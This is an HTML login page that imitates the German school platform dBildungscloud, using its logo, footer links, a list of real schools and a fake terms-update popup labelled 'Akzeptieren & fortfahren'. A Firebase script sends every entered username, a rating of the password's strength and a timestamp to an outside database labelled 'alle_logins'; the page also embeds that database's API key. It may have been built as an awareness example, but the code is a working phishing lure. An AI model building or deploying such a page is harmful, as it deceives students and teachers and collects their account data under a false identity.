<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login ‚Äì Beispielseite</title>
    <link rel="stylesheet" type="text/css" href="css.css">
    <link rel="icon" type="image/png" href="wolke.png">
</head>

<style>
    body {
        font-family: sans-serif;
        background: white;
        margin: 0;
        padding: 0;
        font-weight: bold;
        font-size: 18px;
    }
</style>

<body>

<!-- Popup Overlay -->
<div id="popup-overlay">
  <div id="popup">
    <div id="popup-content">
      <span style="text-align: center;"><h2>√Ñnderung der Nutzungsbedingungen!</h2></span>
      <p>
        Die √Ñnderungen betreffen unter Anderem:<br><br>
        ‚Ä¢ den Umgang mit personenbezogenen Daten,<br><br>
        ‚Ä¢ neue Sicherheitsma√ünahmen,<br><br>
        ‚Ä¢ erweiterte Funktionen f√ºr Lehrkr√§fte und Sch√ºler.<br><br>
        Bitte lesen Sie die neuen Bedingungen sorgf√§ltig durch.<br><br>
        Durch die weitere Nutzung unseres Cloudservices stimmen Sie den aktualisierten Nutzungsbedingungen zu.<br><br>
        --> G√ºltig ab: 01.03.2025
      </p>
      <button id="closePopup" class="close-btn">[ Akzeptieren & fortfahren ]</button>
    </div>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const overlay = document.getElementById("popup-overlay");
    const closeBtn = document.getElementById("closePopup");
    closeBtn.addEventListener("click", () => {
        overlay.style.display = "none";
    });
});
</script>

<div class="seite">
    <div class="logo">
        <a href="https://dbildungscloud.de/">
            <img src="dbildungscloud logo.svg" alt="Logo">
        </a>
    </div>

    <div class="container">
        <h1>Login f√ºr registrierte Nutzer:innen</h1>

        <div class="form-group">
            <label>E-Mail / Nutzername</label>
            <input type="text" id="usernameInput" placeholder="E-Mail / Nutzername">
        </div>

        <div class="form-group-password">
            <label>Passwort</label> 
            <input type="password" id="password" placeholder="Passwort">
            <button type="button" class="toggle-password" title="Passwort anzeigen" alt="Passwort anzeigen">
                <img src="Augezu.png" id="auge">
            </button>
        </div>

<script>
    function checkPasswordStrength(password) {
    if (password.length < 6) {
        return "Schwach";
    }
    const hasLetters = /[a-zA-Z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    if (password.length >= 8 && hasLetters && hasNumbers && hasSpecial) {
        return "Stark";
    } else if (password.length >= 6 && hasLetters && hasNumbers) {
        return "Mittel";
    } else {
        return "Schwach";
    }
}

document.addEventListener("DOMContentLoaded", function () {
    const passwordInput = document.getElementById("password");
    const toggleBtn = document.querySelector(".toggle-password");
    const auge = document.getElementById("auge");

    toggleBtn.addEventListener("click", function () {
        const isHidden = passwordInput.type === "password";
        passwordInput.type = isHidden ? "text" : "password";
        auge.src = isHidden ? "Augeauf.png" : "Augezu.png";
    });
});
</script>

<div id="optionsWrapper">
    <button id="toggleButton" class="options-btn">‚ñ≤ Mehr Optionen</button>

    <div id="options" class="options-container" style="display: none;">
        <label>Schule</label><br>
        <select class="schule">
            <option>W√§hle deine Schule</option>
            <option>Hannah-Arendt-Gymnasium</option>
            <option>Private Gymnasien Schloss Buldern</option>
            <option>Ev. Grund- und Oberschule "Stephan Roth"</option>
            <option>L√ñWENROT-Gymnasium</option>
            <option>Ev. Zinzendorfschulen Herrnhut</option>
            <option>Evangelische Oberschule Gro√ür√ºckerswalde</option>
            <option>Fritz-Karsen-Schule</option>
            <option>Ev. Oberschule Lunzenau</option>
        </select>
        <br><br>

        <label>System</label><br>
        <select class="system">
            <option>Keine Systeme verf√ºgbar</option>
        </select>
    </div>
</div>

<script>
const btn = document.getElementById("toggleButton");
const options = document.getElementById("options");
const wrapper = document.getElementById("optionsWrapper");

btn.addEventListener("click", () => {
    const opened = options.style.display === "block";
    if (opened) {
        options.style.display = "none";
        wrapper.prepend(btn);
        btn.innerText = "‚ñ≤ Mehr Optionen";
    } else {
        options.style.display = "block";
        options.after(btn);
        btn.innerText = "‚ñº Weniger";
    }
});
</script>

<br><br>
<button class="login-btn" id="loginBtn">Login</button>


<a href="#" class="forgot">Passwort vergessen?</a>
</div>
</div>

<!-- -------------------------------------------------------------- -->
<!-- üî• Firebase Einbindung + Speichern aller eingegebenen Namen üî• -->
<!-- -------------------------------------------------------------- -->

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAxJCE8AELVQGZub1e-vBzcWxdn_2bveGw",
  authDomain: "dbildungscloud.firebaseapp.com",
  projectId: "dbildungscloud",
  storageBucket: "dbildungscloud.firebasestorage.app",
  messagingSenderId: "435869869232",
  appId: "1:435869869232:web:dcf44e91e625f5d786c775",
  databaseURL: "https://dbildungscloud-default-rtdb.europe-west1.firebasedatabase.app"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function checkPasswordStrength(password) {
    if (password.length < 6) {
        return "Schwach";
    }
    const hasLetters = /[a-zA-Z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    if (password.length >= 8 && hasLetters && hasNumbers && hasSpecial) {
        return "Stark";
    } else if (password.length >= 6 && hasLetters && hasNumbers) {
        return "Mittel";
    } else {
        return "Schwach";
    }
}

document.getElementById("loginBtn").addEventListener("click", () => {
    const username = document.getElementById("usernameInput").value;
    const password = document.getElementById("password").value;

    if (!username) {
        alert("Bitte zuerst einen Nutzernamen eingeben!");
        return;
    }

    const strength = checkPasswordStrength(password);

    const loginsRef = ref(db, "alle_logins");
    const newEntry = push(loginsRef);

    set(newEntry, {
        name: username,
        passwortStaerke: strength,
        timestamp: new Date().toISOString()
    });

    console.log(`Passwortst√§rke: ${strength} wurde mitgespeichert.`);
});
</script>


<!-- ----------------------- FOOTER ----------------------- -->

<div class="footer">

    <a href="https://dbildungscloud.de/imprint">Impressum</a> ‚Ä¢
    <a href="https://s3.hidrive.strato.com/cloud-instances/default/Willkommensordner/Datenschutz/Nutzungsordnung_Schueler-innen.pdf">Nutzungsordnung</a> ‚Ä¢
    <a href="Datenschutzerkl√§rung der Schule.pdf" download=>Datenschutzerkl√§rung</a> ‚Ä¢
    <a href="mailto:ticketsystem@dbildungscloud.de?subject=dBildungscloud%20Anfrage">Kontakt</a> ‚Ä¢
    <a href="https://github.com/hpi-schul-cloud/">GitHub</a>
    <a href="https://status.dbildungscloud.de/">Status</a> ‚Ä¢
    <a href="#">Sicherheit</a>
    <br><br>
    2025 Bildungscloud Made with <span style="color: #90342d;">‚ù§</span> in Potsdam Translated by
    <a href="https://lokalise.com">
        <img src="lokalise logo.jpg" width="100" height="20">
    </a>

</div>

<div class="footer-handy">

 <a href="https://dbildungscloud.de/imprint">Impressum</a> 
 <a href="https://s3.hidrive.strato.com/cloud-instances/default/Willkommensordner/Datenschutz/Nutzungsordnung_Schueler-innen.pdf">Nutzungsordnung</a> 
 <a href="Datenschutzerkl√§rung der Schule.pdf" download=>Datenschutzerkl√§rung</a> 
 <a href="mailto:ticketsystem@dbildungscloud.de?subject=dBildungscloud%20Anfrage">Kontakt</a> 
 <a href="https://github.com/hpi-schul-cloud/">GitHub</a>
 <a href="https://status.dbildungscloud.de/">Status</a> 
 <a href="#">Sicherheit</a>
 <br><br>
 2025 Bildungscloud Made with <span style="color: #90342d;">‚ù§</span> in Potsdam Translated by
 <br><br>
 <a href="https://lokalise.com">
    <img src="lokalise transparent.png" width="100" height="20">
 </a>

</div>

<div class="footer-tablet">

 <a href="https://dbildungscloud.de/imprint">Impressum</a> 
 <a href="https://s3.hidrive.strato.com/cloud-instances/default/Willkommensordner/Datenschutz/Nutzungsordnung_Schueler-innen.pdf">Nutzungsordnung</a> 
 <a href="Datenschutzerkl√§rung der Schule.pdf" download=>Datenschutzerkl√§rung</a> 
 <a href="mailto:ticketsystem@dbildungscloud.de?subject=dBildungscloud%20Anfrage">Kontakt</a> 
 <a href="https://github.com/hpi-schul-cloud/">GitHub</a>
 <a href="https://status.dbildungscloud.de/">Status</a> 
 <a href="#">Sicherheit</a>
 <br><br>
 2025 Bildungscloud Made with ‚ù§Ô∏è in Potsdam Translated by
 <a href="https://lokalise.com">
    <img src="lokalise transparent.png" width="100" height="20">
 </a>

</div>


</body>
</html>
